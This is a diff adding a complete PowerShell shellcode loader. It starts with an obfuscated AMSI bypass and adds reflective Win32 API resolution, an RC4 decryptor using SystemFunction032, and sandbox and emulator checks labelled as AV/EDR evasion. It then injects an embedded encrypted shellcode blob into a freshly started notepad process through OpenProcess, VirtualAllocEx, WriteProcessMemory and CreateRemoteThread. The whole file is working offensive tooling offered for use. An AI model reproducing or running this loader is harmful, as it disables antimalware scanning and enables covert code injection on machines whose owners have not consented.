@@ -1,0 +1,180 @@
+# AMSI Bypass
+[Ref].Assembly.GetType('System.Management.Automation.Amsi'+[char]85+'tils').GetField('ams'+[char]105+'InitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+    @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+    Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+    [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
+    [System.MulticastDelegate])
+    $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+    [System.Reflection.CallingConventions]::Standard, $func).
+    SetImplementationFlags('Runtime, Managed')
+    $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+    SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+#Add-Type -Name "Kernel032" -Namespace "Win32" -MemberDefinition @"
+#    [DllImport("kernel32.dll", SetLastError = true)]
+#    public static extern IntPtr GetCurrentProcess();
+#    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+#    public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+#"@
+
+# Create a reflection for the RC4 decryption routine
+Add-Type @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class RC4Decryptor
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CRYPTO_BUFFER
+        {
+            public UInt32 Length;
+            public UInt32 MaximumLength;
+            public IntPtr Buffer;
+        }
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern int SystemFunction032(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);
+
+        public static byte[] Decrypt(byte[] input, byte[] key)
+        {
+            CRYPTO_BUFFER inputBuffer = new CRYPTO_BUFFER();
+            inputBuffer.Length = inputBuffer.MaximumLength = (UInt32)input.Length;
+            inputBuffer.Buffer = Marshal.AllocHGlobal(input.Length);
+            Marshal.Copy(input, 0, inputBuffer.Buffer, input.Length);
+
+            CRYPTO_BUFFER keyBuffer = new CRYPTO_BUFFER();
+            keyBuffer.Length = keyBuffer.MaximumLength = (UInt32)key.Length;
+            keyBuffer.Buffer = Marshal.AllocHGlobal(key.Length);
+            Marshal.Copy(key, 0, keyBuffer.Buffer, key.Length);
+
+            int ret = SystemFunction032(ref inputBuffer, ref keyBuffer);
+            if (ret != 0) {
+                throw new Exception("Decryption failed with error code: " + ret);
+            }
+
+            byte[] output = new byte[inputBuffer.Length];
+            Marshal.Copy(inputBuffer.Buffer, output, 0, output.Length);
+
+            Marshal.FreeHGlobal(inputBuffer.Buffer);
+            Marshal.FreeHGlobal(keyBuffer.Buffer);
+
+            return output;
+        }
+    }
+"@
+
+
+
+function Convert-Base64StringToBytes {
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$base64String
+    )
+
+    $bytes = [System.Convert]::FromBase64String($base64String)
+    return $bytes
+}
+
+function Read-FileToByteArray {
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [string]$filePath
+    )
+
+    $fileStream = New-Object System.IO.FileStream($filePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
+    $binaryReader = New-Object System.IO.BinaryReader($fileStream)
+    $byteArray = $binaryReader.ReadBytes((Get-Item $filePath).length)
+    $binaryReader.Close()
+    $fileStream.Close()
+
+    return $byteArray
+}
+
+# Check for time elapse to bypass AV/EDR
+function IsEmulator() {
+    $t1 = Get-Date
+    Start-Sleep -Seconds 2
+    $t2 = (Get-Date).Subtract($t1).TotalSeconds
+    if ($t2 -lt 1.5) {
+        return $true
+    }
+    return $false
+}
+
+# Check if memory allocate is set to NULL to bypass AV/EDR
+
+$hproc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll GetCurrentProcess), (getDelegateType @([IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero)
+$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocExNuma), 
+  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hproc, [IntPtr]::Zero, 0x1000, 0x3000, 0x40, 0x0)
+
+function IsSandbox() {
+    $hproc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll GetCurrentProcess), (getDelegateType @([IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero)
+    $mem = $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocExNuma), 
+  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hproc, [IntPtr]::Zero, 0x1000, 0x3000, 0x40, 0x0)
+    if ($mem -eq [System.IntPtr]::Zero) {
+        return $true
+    }
+    return $false
+}
+
+
+function inject {
+
+# Inject to explorer or start a legitimate process that will run the payload
+#$procId = (Get-Process explorer).Id
+$procId = (Start-Process -FilePath C:\\Windows\\System32\\notepad.exe -PassThru).Id
+
+# AV/EDR Evasions if fails the program will not execute the payload
+if (IsEmulator) { return }
+if (IsSandbox) { return }
+
+# rc4 encoded raw shellcode using openssl (https://s3cur3th1ssh1t.github.io/SystemFunction032_Shellcode/) or python script created by snovvcrash (https://gist.github.com/snovvcrash/3533d950be2d96cf52131e8393794d99)
+# to generate  openssl enc -rc4 -in calc.bin -K `echo -n 'aaaaaaaaaaaaaaaa' | xxd -p` -nosalt > enccalc.bin 
+$base64String = "h5CA2qFy0UXxZtVxoE3FD3+rteBwBqxUYddpGuC7PJn867RPN6m1LKnesxrC0yMeiDqI8hmxMZgvm9IybsL2U5tqBQ+o6l2Czk3Y9sb2bMb+bYxfuj9P0AMdM5nBBHBukeihZ8L4ql3qn0qi91iR94YmH4jd5cGhq4/wbrNcDg0Da7+zqrwCYzAUMg//wD064FjVV0rcKNwjsyDokXr4F7JqKeSa9+qNMcSyt7X2ODHmUgHDXpRJ4Cuttggl5z6F7WhvRxJ3dZWu7E/qL+GMTTTiAIeekNY9wLIHN5tq8ZQztAKxAq+jHp4JvHhTI83g3SDtpnSOA26uwRWIi+TS3X7BDx9zLMXjELb+tRryP73CnN1wwae4dujUt/e4tL4XxAodcY5YciL+eBf/dcxp+IWmYuE0E7aZLm2jI2bUv4uCKDFwGoSBAycZpK2/xohCVeuMYcc2MvSfY95tUVOqW1gB/AtJlUhnU4MljRaYgk9D/iyviVtmFyPLJAZpmtgX6j27CP/jqrZR+I6hGMClKX5bJujpvoP/CGA/kKgL09tJgQug/ZDoc+kG8n1eQa2b51TzzrwRRCCzDi8eiH6CPPkGI+ztSqUbETpfdxZG2wU5narTchAYJ3rM9jMqxZcRq+neycGUOfPFsF+U0Y2kJ51KJa6hsA0sKNmODsh997MbCricLM5TkgkhP2XnYpOIOamiJz3uDXlB0AOHFMZbOIWOIyWXlMuntNPaST3SdKEltDLQLm4XXrRo8wRdMAx0IeSLkaCADqiEcIg="
+$inputBytes = Convert-Base64StringToBytes $base64String
+#$inputBytes = Read-FileToByteArray "C:\\Users\\netsyncoffsec\\Desktop\\enccalc.bin"
+$key = [System.Text.Encoding]::UTF8.GetBytes("0ffs3cS4ysTryH4rd3r!")
+$output = [RC4Decryptor]::Decrypt($inputBytes, $key)
+
+# C#: IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, procId);
+$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
+  (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)
+
+# C#: IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
+$expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
+  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$output.Length, 0x3000, 0x40)
+
+# C#: bool procMemResult = WriteProcessMemory(hProcess, expAddr, $output, len, out bytesWritten);
+$procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
+  (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $output, [Uint32]$output.Length, [IntPtr]::Zero)         
+
+# C#: IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
+  (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, 0, [IntPtr]::Zero)
+}
+
+inject
